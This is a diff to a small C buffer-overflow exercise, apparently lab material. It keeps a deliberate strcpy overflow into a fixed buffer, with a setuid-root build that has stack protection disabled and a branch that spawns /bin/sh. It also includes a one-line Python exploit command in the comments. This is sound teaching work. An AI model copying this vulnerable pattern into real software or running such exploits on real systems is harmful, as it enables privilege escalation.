@@ -9,17 +9,13 @@
 // COMPILE $ gcc -fno-stack-protector bof4.c -o bof4
 // SETUID  $ sudo chown root:root bof4
 //         $ sudo chmod 4755 bof4
-// EXPLOIT $ ./bof4 `py3 -c "print('\x78\x56\x34\x12'*36)"`
+// EXPLOIT $ ./bof4 `python -c "print('\x78\x56\x34\x12'*36)"`
 
-int main(int argc, char *argv[]){
-    if (argc < 2) {
-        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
-        return 1;
-    }
+void vuln(char * arg) {
     int innocent;
     char buf[BUF_SIZE];
 
-    strcpy(buf, argv[1]);
+    strcpy(buf, arg);
     printf("Hello %s!\n", buf);
 
     if (innocent == KEY) {
@@ -29,5 +25,13 @@ int main(int argc, char *argv[]){
         }
         system("/bin/sh");
     }
+}
+
+int main(int argc, char *argv[]){
+    if (argc < 2) {
+        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
+        return 1;
+    }
+    vuln(argv[1]);
     return 0;
 }
